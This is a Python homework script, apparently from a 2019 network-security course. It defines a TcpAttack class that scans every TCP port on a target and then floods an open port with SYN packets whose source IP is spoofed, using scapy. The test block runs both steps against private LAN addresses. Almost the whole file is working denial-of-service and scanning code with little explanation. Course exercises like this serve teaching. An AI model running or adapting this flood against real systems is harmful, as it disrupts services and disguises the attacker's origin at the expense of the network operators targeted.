#!/usr/bin/env python3
# USING PYTHON 3.6.7

# Homework Number: 8
# Name: Michael Cupka
# ECN Login: mcupka
# Due Date: March 21, 2019

import sys
import os
import socket
from scapy.all import *

# TcpAttack Class
class TcpAttack:

	# constructor function
	def __init__(self, spoofIP, targetIP):
		self.spoofIP = spoofIP
		self.targetIP = targetIP

	#function to scan ports in the given range and print the open ones to the file openports.txt
	def scanTarget(self, rangeStart, rangeEnd):
		ports_open = []
		ports_found = 0
		outfile = open('openports.txt', 'w')

		# loop through each port in the range
		for i in range(rangeStart, rangeEnd + 1):
			port = i

			# create socket object
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.settimeout(.1) # socket time out for attempted connections

			# attempt to connect to the port
			result = sock.connect_ex((self.targetIP, port))

			# connect_ex will return a 0 if the port is open
			if result == 0:
				ports_open.append(port)
				ports_found += 1

		# write the open port values to the output file
		for j in range(ports_found):
			outfile.write(str(ports_open[j]))
			if j < ports_found - 1: outfile.write('\n')

		outfile.close()


	# function to create numSyn SYN packets and send them to the target IP while spoofing the source IP
	def attackTarget(self, port, numSyn):

		# check that the given port is open
		# create socket object
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.settimeout(.1)  # socket time out for attempted connections

		# attempt to connect to the port
		result = sock.connect_ex((self.targetIP, port))

		# connect_ex will return a 0 if the port is open
		if result != 0: return 0

		for i in range(0, numSyn):
			# do this numSyn times

			ip_head = IP(src=self.spoofIP, dst=self.targetIP) # create IP header with appropriate src and dst
			tcp_head = TCP(flags="S", sport=RandShort(), dport=port) # create a TCP header with SYN flag set
			syn_packet = ip_head / tcp_head # append the headers to create the syn packet to send
			# send the packet
			try:
				send(syn_packet)
			except Exception as e:
				print(e) # print exception if there is a problem

		return 1


# main block used for testing the class
if __name__ == "__main__":
	spoofIP = '192.168.1.30'
	targetIP = '192.168.1.68'
	Tcp = TcpAttack(spoofIP, targetIP)
	Tcp.scanTarget(0,65535)
	Tcp.attackTarget(22, 100)
	print(Tcp.attackTarget(10, 100))




